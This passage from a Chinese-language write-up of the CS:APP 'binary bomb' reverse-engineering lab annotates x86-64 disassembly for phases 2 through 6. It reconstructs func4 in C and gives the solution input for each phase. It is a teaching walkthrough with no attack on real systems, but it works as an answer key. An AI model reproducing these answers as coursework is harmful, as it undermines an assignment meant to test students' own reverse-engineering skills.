<p>因此本次通关<code>payload</code>：<code>Border relations with Canada have never been better.</code></p>
<h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>经过长时间的动态调试后，该函数主要的功能是：</p>
<p>先调用<code>sscanf()</code>函数将我们输入的字符串解析成若干个数字，数字个数必须是6个，然后第一个数字必须是1，接着用循环判断这些数字，要满足后面的数字是前面一个上数字的两倍，因此我们可以直接输入<code>1 2 4 8 16 32</code></p>
<p>下面是<code>phase_2</code>函数的解析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; bobm.s </span><br><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  ; 将rsp的内容给rsi，rsi作为函数调用过程中的第二个参数，说明read_six_numbers函数的入参参数至少有两个</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	call   40145c &lt;read_six_numbers&gt;</span><br><span class="line">  ; 经过上面的函数调用，rsp指向的地址中，保存的是若干个整数</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">  ; 输入的第一个参数必须是 1</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:	e8 25 05 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  ; 直接跳 400f30</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  ; 获取上一个位置的值</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">  ; 上一个值加倍</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">  ; 和当前的相比，是否相等</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  ; 相等直接跳 400f25</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  ; 不等就调用 explode_bomb</span><br><span class="line">  400f20:	e8 15 05 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  ; rbx往后移动</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">  ; 判断  rbp 是否和 rbx 相等，不等的时候跳 400f17，即继续循环</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  ; 否则跳400f3c</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  ; rbx 指向 rsp 的下一个位置</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  ; 直接跳 400f17</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p><code>read_six_numbers</code>函数内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; bobm.s </span><br><span class="line">000000000040145c &lt;read_six_numbers&gt;:</span><br><span class="line">  40145c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  ; 将rsi的内容给rdx，而rdx是函数调用过程中第三个参数</span><br><span class="line">  ; 后面调用了 sscanf ，而 sscanf 函数的第三个参数是解析字符串后的第一个值，</span><br><span class="line">  ; 因此我们可以大胆猜测rdx指向的内存，是保存解析我们输入的字符串所代表的数字</span><br><span class="line">  401460:	48 89 f2             	mov    %rsi,%rdx</span><br><span class="line">  401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx</span><br><span class="line">  401467:	48 8d 46 14          	lea    0x14(%rsi),%rax</span><br><span class="line">  40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp)</span><br><span class="line">  401470:	48 8d 46 10          	lea    0x10(%rsi),%rax</span><br><span class="line">  401474:	48 89 04 24          	mov    %rax,(%rsp)</span><br><span class="line">  401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9</span><br><span class="line">  40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8</span><br><span class="line">  401480:	be c3 25 40 00       	mov    $0x4025c3,%esi</span><br><span class="line">  401485:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  ; 调试过程中我们发现第二个参数是 %d %d %d %d %d %d</span><br><span class="line">  40148a:	e8 61 f7 ff ff       	call   400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  40148f:	83 f8 05             	cmp    $0x5,%eax </span><br><span class="line">  ; sscanf函数返回值与0比较，小于等于5则调用explode_bomb</span><br><span class="line">  ; 因此我们要输入6个数字，并以空格相隔</span><br><span class="line">  401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">  401494:	e8 a1 ff ff ff       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  401499:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  40149d:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>因此通关<code>payload</code>：<code>1 2 4 8 16 32</code></p>
<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  ; 栈帧有24字节大小</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  ; 函数调用的第4个参数</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  ; 函数调用的第3个参数</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  ; 动态调试过程发现 0x4025cf 执行的内容是 %d %d</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	call   400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  ; 返回值要大于1.因此我们可以得出结论，程序将我们输入的两个数字保存到了栈上，</span><br><span class="line">  ; 第一个数字距离栈顶8字节，第二个数字距离栈顶12字节</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:	e8 d0 04 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  ; 无符号比较，第一个数字与7比较，如果大于7，则跳 400fad，即调用explode_bomb</span><br><span class="line">  ; 因此第一个数字要小于等于7</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">  ; 第一个数字给eax</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax</span><br><span class="line">  ; 跳到 0x402470 + rax*8 的位置</span><br><span class="line">  ; 理想状况下，最好能够直接跳到 400fc9，但是如果想要跳到这个位置，那么需要我们输入的是一个负数</span><br><span class="line">  ; 可是输入负数后，上面的cmpl又过不了</span><br><span class="line">  ; 我输入的是0，然后就跳过了这里</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmp    *0x402470(,%rax,8)</span><br><span class="line">  ; 将0xcf给eax</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax</span><br><span class="line">  ; 跳 400fbe</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  ; 将我们输入的第二个数字与eax比较</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br><span class="line">  ; 相等就跳 400fc9 因此第二个数字必须是0xcf&#x3D;207</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:	e8 71 04 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>因此最终我们要先输入一个0~7的数字，再输入207</p>
<p>因此通关<code>payload</code>:<code>0 207</code></p>
<h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  ; 栈帧有24字节大小</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  ; 函数调用的第4个参数，实际上该地址对应我们输入的第二个数字</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  ; 函数调用的第3个参数，实际上该地址对应我们输入的第一个数字</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  ; 动态调试过程发现 0x4025cf 执行的内容是 %d %d</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	call   400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  ; 返回值要等于2，即我们输入的字符串中，必须包含且仅包含两个数字</span><br><span class="line">  ; 第一个数字距离栈顶8字节，第二个数字距离栈顶12字节</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  ; 取第一个数字进行无符号比较</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">  ; 小于等于 0xe &#x3D; 14 则 跳40103a</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">  ; 否则调用 explode_bomb,因此我们输入的第一个数字必须小于等于14</span><br><span class="line">  401035:	e8 00 04 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  ; 函数调用的第3个参数,值为0xe</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">  ; 函数调用的第2个参数,值为0x0</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  ; 函数调用的第1个参数,值为我们输入的第一个数字</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi</span><br><span class="line">  401048:	e8 81 ff ff ff       	call   400fce &lt;func4&gt;</span><br><span class="line">  ; 检查返回值</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax</span><br><span class="line">  ; 如果不等于0，则跳401058</span><br><span class="line">  ; 因此我们要使得func4函数返回值为0</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  ; 将0xc(%rsp)与0x0相比</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  ; 相等则跳40105d，实际上我们需要使得该位置变为0</span><br><span class="line">  ; 该位置实际上是我们输入的第二个数字</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>查看<code>func4()</code>内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  ; 栈帧有8字节大小</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  ; 将传进来的第三个参数给eax</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax</span><br><span class="line">  ; eax &#x3D; eax - esi ,即 eax减去传过来的第二个参数</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax</span><br><span class="line">  ; eax &#x3D; ecx</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx</span><br><span class="line">  ; 逻辑右移31位后，ecx最低位是原先的最高位</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax</span><br><span class="line">  ; 算术右移一位（除以2）</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax</span><br><span class="line">  ; ecx &#x3D; rax + rsi * 1</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx</span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  ; 如果 ecx 小于等于 edi，则跳400ff2（mov    $0x0,%eax）</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;</span><br><span class="line">  ; 否则，edx &#x3D; rcx -1</span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">  ; 递归调用</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	call   400fce &lt;func4&gt;</span><br><span class="line">  ; eax &#x3D; eax + eax;</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  ; 跳401007，即函数返回</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  ; 如果 edi 大于等于 ecx，则跳 401007（add    $0x8,%rsp）</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">  ; 否则，esi &#x3D; rcx + 1</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">  ; 递归调用</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	call   400fce &lt;func4&gt;</span><br><span class="line">  ; eax &#x3D; rax + rax * 1 + 1</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  40100b:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>对应的C代码大致如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">func4</span><span class="params">(<span class="keyword">unsigned</span> di, <span class="keyword">unsigned</span> si, <span class="keyword">unsigned</span> dx)</span></span>&#123;</span><br><span class="line">    ax = dx - si;</span><br><span class="line">    cx = ax;</span><br><span class="line">    <span class="comment">// 对cx无符号右移31位</span></span><br><span class="line">    <span class="comment">// 即 如果dx小于si，则cx=1</span></span><br><span class="line">    <span class="keyword">if</span>(cx &amp; <span class="number">0x80000000</span>)&#123;</span><br><span class="line">        cx = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        cx = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ax = cx + ax;</span><br><span class="line">    <span class="comment">// 算数右移</span></span><br><span class="line">    ax = ax &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    cx = ax + si;</span><br><span class="line">    <span class="comment">// 2~14行，等价于 cx=(|dx-si|+dx-si)/2+si</span></span><br><span class="line">    <span class="comment">// |dx-si| 要么是0，要么是1</span></span><br><span class="line">    <span class="keyword">if</span>(cx == di)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(cx&lt;di)&#123;</span><br><span class="line">    	si = cx + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2</span> * func(di,si,dx) + <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        dx = cx - <span class="number">1</span>;</span><br><span class="line">        ax = <span class="keyword">return</span> <span class="number">2</span> * func(di,si,dx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设一开始我们输入的数字是x，我们来看一下调用栈</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f(x,0,14)</span><br><span class="line">  |-- 0                : if x &#x3D;&#x3D; 7</span><br><span class="line">  |-- 2 * f(x,8,14) + 1: if x &gt; 7</span><br><span class="line">  |-- 2 * f(x,0,6)     : if x &lt; 7</span><br></pre></td></tr></table></figure>

<p>再通关条件是：</p>
<ul>
<li><p>输入的第一个数字是小于等于14</p>
</li>
<li><p>输入的第二个数字是0</p>
</li>
<li><p>func4函数返回值是0</p>
</li>
</ul>
<p>因此满足条件的一个<code>payload</code>是<code>7 0</code>（当然不止这一个，满足<code>func4</code>返回值是0的都可以）</p>
<p>因此通关<code>payload</code>:<code>7 0</code></p>
<h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   %rbx</span><br><span class="line">  401063:	48 83 ec 20          	sub    $0x20,%rsp</span><br><span class="line">  401067:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401071:	00 00 </span><br><span class="line">  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:	31 c0                	xor    %eax,%eax</span><br><span class="line">  40107a:	e8 9c 02 00 00       	call   40131b &lt;string_length&gt;</span><br><span class="line">  ; 输入的长度必须是6</span><br><span class="line">  40107f:	83 f8 06             	cmp    $0x6,%eax</span><br><span class="line">  401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:	e8 b1 03 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  ; ecx &#x3D; rbx + rax * 1</span><br><span class="line">  ; 循环开始 rax 从0~5变化，实际上相当于循环获取数组中的内容，然后每个元素和0xf进行与操作</span><br><span class="line">  ; 而该数组用rbx地址指定，rbx又由rdi指定，rdi指向我们输入的字符串</span><br><span class="line">  ; 因此实际上是遍历我们的字符串，依次把每个元素与0xf进行与操作，然后作为偏移地址</span><br><span class="line">  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">  40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">  401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">  401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">  ;rdx作为偏移地址，获取 0x4024b0 开始偏移rdx的内容，写入到edx中</span><br><span class="line">  ;0x4024b0的内容为maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</span><br><span class="line">  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">  ; 然后再写入到rsp+rax+0x10中</span><br><span class="line">  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">  4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">  ; 如果rax-6不等于0，则跳至40108b（循环结束）</span><br><span class="line">  4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  ; 将距离栈顶0x16个字节的内容赋值为0</span><br><span class="line">  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">  ; 将$0x40245e给esi</span><br><span class="line">  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">  ; 将距离栈顶0x10个字节的字符串地址给rdi</span><br><span class="line">  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">  ; 调用字符串是否相等，实际上是判断距离栈顶0x10个字节的字符串和$0x40245e所在的字符串是否相等</span><br><span class="line">  ; 动态调试过程中，该值我们可以查到为：flyers</span><br><span class="line">  4010bd:	e8 76 02 00 00       	call   401338 &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">  4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:	e8 6f 03 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:	eb 07                	jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:	00 00 </span><br><span class="line">  4010e7:	74 05                	je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:	e8 42 fa ff ff       	call   400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:	48 83 c4 20          	add    $0x20,%rsp</span><br><span class="line">  4010f2:	5b                   	pop    %rbx</span><br><span class="line">  4010f3:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>最主要的是循环体中的内容。</p>
<p>为了从<code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code>中获得<code>flyers</code>字符串，我们要根据下表依次构建索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m a d u i e r s n f o  t  v  b  y  l</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15</span><br></pre></td></tr></table></figure>

<p>需要构建的索引是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9 15 14 5 6 7</span><br></pre></td></tr></table></figure>

<p>也就是说，我们输入的字符串中，每次和<code>0xf</code>相与后，得到的是上述的值，观察ascii表，我们可以发现很多符合条件的，一个符合条件的是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9?&gt;567</span><br></pre></td></tr></table></figure>

<p>他们的ascii码16进制表示分别为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x39 0x3F 0x3E 0x35 0x36 0x37</span><br></pre></td></tr></table></figure>

<p>因此通关<code>payload</code>：<code>9?&gt;567</code></p>
<h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>这一关卡源码太多了，我实在没有完全看明白，就算借助了IDA，也只是阅读了前半部分（步骤5和步骤6看网上别人分析的）：</p>
<ol>
<li>将输入的字符串解析成6个数字</li>
<li>判断每个数字是否都小于等于6</li>
<li>判断6个数字中是否有重复值</li>
<li>将每个数字都变成“对应的相反数加上7”</li>
<li>遍历每个数字，根据每个数字的值作为偏移量，遍历0x6032d0指向的链表，获取指定偏移量后对应的链表节点的地址，将该地址写入到栈上某个地方（可以理解成一个数组）</li>
<li>遍历上个步骤得到的数组，其元素是若干个地址，要求当前元素指向的内容小于上个元素指向的内容，即我们要想办法构造一个逆序序列</li>
</ol>
<p>而链表<code>0x6032d0</code>内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">          +----------|---------+ </span><br><span class="line">0x6032d0  |   332    |0x6032e0 | </span><br><span class="line">          +----------|---------+ </span><br><span class="line">          +----------|---------+ </span><br><span class="line">0x6032e0  |  168     |0x6032f0 | </span><br><span class="line">          +----------|---------+ </span><br><span class="line">                                 </span><br><span class="line">          +----------|---------+ </span><br><span class="line">0x6032f0  |  924     |0x603300 | </span><br><span class="line">          +----------|---------+ </span><br><span class="line">                                 </span><br><span class="line">          +----------|---------+ </span><br><span class="line">0x603300  |  691     |0x603310 | </span><br><span class="line">          +----------|---------+ </span><br><span class="line"></span><br><span class="line">          +----------|---------+</span><br><span class="line">0x603310  |  477     |0x603320 |</span><br><span class="line">          +----------|---------+</span><br><span class="line"></span><br><span class="line">          +----------|---------+</span><br><span class="line">0x603320  |  443     |   0x0   |</span><br><span class="line">          +----------|---------+</span><br></pre></td></tr></table></figure>

<p>为了使得第一个元素指向的值是最大的，我们应该将第一个元素的值设置为<code>0x6032f0</code>，而该地址相对链首而言是第3个。第二个元素的值为0x603300，相对链首而言是第4个，即</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3 4 5 6 1 2</span><br></pre></td></tr></table></figure>

<p>上述再取相反数，加上7，得到我们原始输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>

<p>下面是一些注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:	41 56                	push   %r14</span><br><span class="line">  4010f6:	41 55                	push   %r13</span><br><span class="line">  4010f8:	41 54                	push   %r12</span><br><span class="line">  4010fa:	55                   	push   %rbp</span><br><span class="line">  4010fb:	53                   	push   %rbx</span><br><span class="line">  ; 开辟80字节空间</span><br><span class="line">  4010fc:	48 83 ec 50          	sub    $0x50,%rsp</span><br><span class="line">  401100:	49 89 e5             	mov    %rsp,%r13</span><br><span class="line">  401103:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  ; 将我们输入的字符串解析为6个数</span><br><span class="line">  401106:	e8 51 03 00 00       	call   40145c &lt;read_six_numbers&gt;</span><br><span class="line">  ; 经过上面的函数调用，rsp指向的地址中，保存的是若干个整数</span><br><span class="line">  40110b:	49 89 e6             	mov    %rsp,%r14</span><br><span class="line">  40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d</span><br><span class="line">  401114:	4c 89 ed             	mov    %r13,%rbp</span><br><span class="line">  401117:	41 8b 45 00          	mov    0x0(%r13),%eax</span><br><span class="line">  40111b:	83 e8 01             	sub    $0x1,%eax</span><br><span class="line">  ; 如果eax-1后，小于等于5，则跳转401128，否则调用explode_bomb</span><br><span class="line">  ; 因此输入的数字要小于等于6</span><br><span class="line">  40111e:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">  401121:	76 05                	jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">  401123:	e8 12 03 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  </span><br><span class="line">  401128:	41 83 c4 01          	add    $0x1,%r12d</span><br><span class="line">  40112c:	41 83 fc 06          	cmp    $0x6,%r12d</span><br><span class="line">  ; 如果r12加一后是6，则跳401153</span><br><span class="line">  401130:	74 21                	je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">  401132:	44 89 e3             	mov    %r12d,%ebx</span><br><span class="line">  401135:	48 63 c3             	movslq %ebx,%rax</span><br><span class="line">  401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax</span><br><span class="line">  ; 实际上这一块完成的是：要输入的6个数字各不相同</span><br><span class="line">  40113b:	39 45 00             	cmp    %eax,0x0(%rbp)</span><br><span class="line">  40113e:	75 05                	jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">  401140:	e8 f5 02 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  401145:	83 c3 01             	add    $0x1,%ebx</span><br><span class="line">  401148:	83 fb 05             	cmp    $0x5,%ebx</span><br><span class="line">  40114b:	7e e8                	jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">  40114d:	49 83 c5 04          	add    $0x4,%r13</span><br><span class="line">  401151:	eb c1                	jmp    401114 